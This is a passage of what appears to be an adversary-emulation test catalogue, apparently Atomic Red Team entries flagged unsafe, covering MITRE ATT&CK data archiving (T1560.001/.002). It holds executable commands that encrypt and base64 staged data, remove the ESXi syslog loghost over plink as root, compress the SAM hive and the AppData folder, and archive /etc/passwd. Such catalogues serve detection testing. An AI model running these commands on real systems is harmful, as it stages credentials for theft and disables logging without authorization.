      command: "zip -r  /tmp/t1560/t1560_data.zip /tmp/t1560\nopenssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc \ncat /tmp/t1560/t1560_data.enc | base64"
      cleanup: rm -rf /tmp/t1560
      timeout: 60
    - name: Encrypts collected data with AES-256 and Base64
      type: bash
      platform: macos
      command: "zip -r  /tmp/t1560/t1560_data.zip /tmp/t1560\nopenssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc \ncat /tmp/t1560/t1560_data.enc | base64"
      cleanup: rm -rf /tmp/t1560
      timeout: 60
    - name: ESXi - Remove Syslog remote IP
      type: powershell
      platform: windows
      command: "# Extract line with IP address from the syslog configuration output\nPathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" > c:\\temp\\loghost.txt\n\n# Replace the IP with \"0\"\nPathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\n\n# Extract the IP from the line extracted from findstr\n$inputFilePath = \"c:\\temp\\loghost.txt\"\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\n\n$fileContent = Get-Content -Path $inputFilePath -Raw\n\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\n    Write-Host \"The content is $fileContent\"\n    Write-Host \"The file is empty\"\n} else {\n    # Use a regular expression to extract IP addresses\n    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\n    \n    $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\n\n    $output | Out-File -FilePath $outputFilePath -Encoding ascii\n    \n    Write-Host \"IP addresses extracted and saved to $outputFilePath\"\n}"
      cleanup: |-
        # Re-add the initially extracted IP
        PathToAtomicsFolder\..\ExternalPayloads\plink.exe -ssh atomic.local -l root -pw n/a -m c:\temp\loghost_ip.txt

        rm c:\temp\loghost_ip.txt
        rm c:\temp\loghost.txt
      timeout: 120
      elevation_required: true
    - name: Compress a File for Exfiltration using Makecab
      type: cmd
      platform: windows
      command: makecab.exe C:\Temp\sam.hiv C:\Temp\art.zip
      cleanup: del C:\Temp\art.zip
      timeout: 120
    - name: Copy and Compress AppData Folder
      type: powershell
      platform: windows
      command: |-
        $AppData="$env:USERPROFILE\AppData"
        $Copy="$env:USERPROFILE\Desktop\AppDataCopy"
        $Zip="$env:USERPROFILE\Desktop\AppDataBackup.zip"

        if (Test-Path $Copy) { Remove-Item $Copy -Recurse -Force }
        New-Item -ItemType Directory -Path $Copy | Out-Null

        Get-ChildItem $AppData -Recurse -Force | ForEach-Object {
          $rel = $_.FullName.Substring($AppData.Length + 1)
          $dest = Join-Path $Copy $rel
          if ($_.PSIsContainer) { New-Item -ItemType Directory -Path $dest -Force | Out-Null }
          else { Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue }
        }

        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1560/001
  is_safe: false
- id: T1560.002
  name: Archive via Library
  description: |-
    An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.

    Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that th...
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Compressing data using GZip in Python (FreeBSD/Linux)
      type: sh
      platform: linux
      command: |-
        which_python=`which python || which python3`
        $which_python -c "import gzip;input_file=open('/etc/passwd', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('/tmp/passwd.gz','wb',compresslevel=6);output_file.write(content);output_file.close();"
      cleanup: rm /tmp/passwd.gz
      timeout: 60
    - name: Compressing data using bz2 in Python (FreeBSD/Linux)
      type: sh
      platform: linux
      command: |-
        which_python=`which python || which python3`
        $which_python -c "import bz2;input_file=open('/etc/passwd','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('/tmp/passwd.bz2','w+');output_file.write(str(bz2content));output_file.close();"
      cleanup: rm /tmp/passwd.bz2
      timeout: 60
    - name: Compressing data using zipfile in Python (FreeBSD/Linux)
      type: sh
      platform: linux
      command: |-
        which_python=`which python || which python3`
        $which_python -c "from zipfile import ZipFile; ZipFile('/tmp/passwd.zip', mode='w').write('/etc/passwd')"
      cleanup: rm /tmp/passwd.zip
      timeout: 60
    - name: Compressing data using tarfile in Python (FreeBSD/Linux)
      type: sh
      platform: linux
      command: |-
        which_python=`which python || which python3`
        $which_python -c "import tarfile; output_file = tarfile.open('/tmp/passwd.tar.gz','w'); output_file.add('/etc/passwd'); output_file.close()"
      cleanup: rm /tmp/passwd.tar.gz
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1560/002
  is_safe: false
